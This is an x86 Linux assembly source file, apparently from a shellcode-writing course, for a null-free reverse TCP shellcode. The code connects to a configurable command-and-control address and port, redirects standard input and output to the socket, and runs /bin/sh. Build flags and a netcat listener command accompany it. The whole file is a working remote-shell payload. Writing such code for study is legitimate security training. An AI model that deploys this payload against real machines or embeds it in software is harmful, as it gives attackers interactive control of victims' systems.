; Filename: reverse_tcp_shellcode.nasm
; Author: Upayan a.k.a. slaeryan
; SLAE: 1525
; Contact: upayansaha@icloud.com
; Purpose: This is a x86 Linux reverse TCP null-free shellcode.
; Usage: ./reverse_tcp_shellcode
; Note: The connection attempt is not tuned so run the listener first. The C2 IP and
; the C2 Port are configurable while assembling with the -D flag(-DC2_IP=0x6801a8c0 -DC2_PORT=0x901f) respectively.
; Compile with:
; ./compile.sh reverse_tcp_shellcode
; Testing: nc -lnvp 8080
; Size of shellcode: 70 bytes


global _start

section .text
_start:

	; Clearing the first 4 registers for 1st Syscall - socket()
	xor eax, eax       ; May also sub OR mul for zeroing out
	xor ebx, ebx       ; Clearing out EBX 
	xor ecx, ecx       ; Clearing out ECX
	cdq                ; Clearing out EDX

	; Syscall for socket() = 359 OR 0x167, loading it in AX
	mov ax, 0x167

	; Loading 2 in BL for AF_INET - 1st argument for socket()
	mov bl, 0x02

	; Loading 1 in CL for SOCK_STREAM - 2nd argument for socket()
	mov cl, 0x01

	; 3rd argument for socket() - 0 is already in EDX register

	; socket() Syscall
	int 0x80

	; Storing the return value socket fd in EAX to EBX for later usage
	mov ebx, eax

	; Loading the C2 IP address in stack - sockaddr_in struct - 3rd argument
	push dword C2_IP      ; 0x6801a8c0 - C2 IP: 192.168.1.104 - reverse - hex

	; Loading the C2 Port in stack - sockaddr_in struct - 2nd argument
	push word C2_PORT     ; 0x901f - C2 Port: 8080

	; Loading AF_INET OR 2 in stack - sockaddr_in struct - 1st argument
	push word 0x02

	; connect() Syscall
	mov ax, 0x16a         ; Syscall for connect() = 362 OR 0x16a, loading it in AX
	mov ecx, esp          ; Moving sockaddr_in struct from TOS to ECX
	mov dl, 16            ; socklen_t addrlen = 16
	int 0x80              ; Execute the connect syscall
  	
	xor ecx, ecx ; Clearing out ECX for 3rd Syscall - dup2()

	mov cl, 0x3 ; Initializing a counter variable = 3 for loop

	; dup2() Syscall in loop
	loop_dup2:
	mov al, 0x3f           ; dup2() Syscall number = 63 OR 0x3f
	dec ecx                ; Decrement ECX by 1
	int 0x80               ; Execute the dup2 syscall
	jnz short loop_dup2    ; Jump back to loop_dup2 label until ZF is set

	; execve() Syscall
	cdq                    ; Clearing out EDX
	push edx               ; push for NULL termination
	push dword 0x68732f2f  ; push //sh
	push dword 0x6e69622f  ; push /bin
	mov ebx, esp           ; store address of TOS - /bin//sh
	mov al, 0x0b           ; store Syscall number for execve() = 11 OR 0x0b in AL
	int 0x80               ; Execute the system call
